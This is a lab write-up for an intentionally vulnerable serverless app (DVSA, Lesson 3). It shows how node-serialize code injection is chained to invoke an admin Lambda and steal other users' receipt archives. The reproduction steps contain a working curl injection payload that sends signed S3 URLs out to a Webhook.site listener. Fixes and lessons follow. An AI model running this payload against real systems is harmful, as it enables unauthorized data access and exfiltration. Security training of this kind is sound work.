# Lesson 3 · Sensitive Data Exposure

## Vulnerability Summary
By chaining the Event Injection vulnerability (Lesson 1), a standard user can invoke the admin-only `DVSA-ADMIN-GET-RECEIPT` Lambda and obtain signed S3 download URLs for **other users' receipt archives** — data they should never be able to access.

## Root Cause
Two flaws combine:
1. `DVSA-ORDER-MANAGER` allows arbitrary code execution via `node-serialize` (Lesson 1)
2. The `DVSA-ORDER-MANAGER` IAM role has `lambda:InvokeFunction` permission for admin functions, violating least privilege

The receipt Lambda generates signed S3 URLs **without verifying the requester's identity**, so any caller with invoke access can retrieve any month's receipts.

## AWS Components
| Component | Role |
|-----------|------|
| API Gateway `/order` | Entry point |
| Lambda (DVSA-ORDER-MANAGER) | Injection target |
| Lambda (DVSA-ADMIN-GET-RECEIPT) | Unauthorized invocation target |
| Amazon S3 | Stores receipt archives |
| Webhook.site | Attacker's exfiltration listener |

## Tools Used
- `curl`
- Webhook.site
- AWS SDK v3 (injected inside Lambda)

## Reproduction Steps

### Step 1 — Set Up Variables
```bash
export WEBHOOK="https://webhook.site/YOUR_UNIQUE_ID"
export TOKEN_B="<your_jwt_token>"
export API="https://<API-ID>.execute-api.us-east-1.amazonaws.com/Stage/order"
```

### Step 2 — Send Injection Payload
```bash
curl -X POST $API \
  -H "Content-Type: application/json" \
  -H "authorization: $TOKEN_B" \
  -d '{"action":"_$$ND_FUNC$$_function(){
    var {LambdaClient,InvokeCommand}=require(\"@aws-sdk/client-lambda\");
    var c=new LambdaClient();
    var p={
      FunctionName:\"DVSA-ADMIN-GET-RECEIPT\",
      InvocationType:\"RequestResponse\",
      Payload:Buffer.from(JSON.stringify({\"year\":\"2026\",\"month\":\"03\"}))
    };
    c.send(new InvokeCommand(p)).then(function(d){
      var h=require(\"https\");
      h.get(\"'$WEBHOOK'?data=\"+encodeURIComponent(Buffer.from(d.Payload).toString()));
    });
  }()", "cart-id":""}'
```

### Step 3 — Retrieve the Exfiltrated URL
Monitor the Webhook.site dashboard. The incoming GET request's `data` query parameter contains a signed S3 URL pointing to the receipts ZIP archive.

### Step 4 — Download the Archive
Open the signed S3 URL in a browser to download `2026-03-dvsa-order-receipts.zip`, which contains receipt files belonging to all users.

## Evidence
- Webhook dashboard receives a signed S3 URL
- Downloading that URL yields a ZIP containing other users' `.txt` receipt files

## Fix Summary
**Code-level:** Remove `node-serialize`; replace with `JSON.parse()` and an action allowlist (blocks injection entirely).

**IAM-level:** Remove `lambda:InvokeFunction` for `DVSA-ADMIN-GET-RECEIPT` from the `DVSA-ORDER-MANAGER` execution role.

```json
"Resource": [
  "arn:aws:lambda:us-east-1:ACCOUNT_ID:function/DVSA-ORDER-MANAGER"
]
```

See [`/Codefix/Lesson03-Sensitive-Data-Exposure/`](../../Codefix/Lesson03-Sensitive-Data-Exposure/) for the patched IAM policy and code.

## Lessons Learned
In serverless architectures, **every function is its own security perimeter**. Code security (input validation) must be paired with cloud security (IAM least privilege) — a single bug in one function should never cascade into a full account compromise.
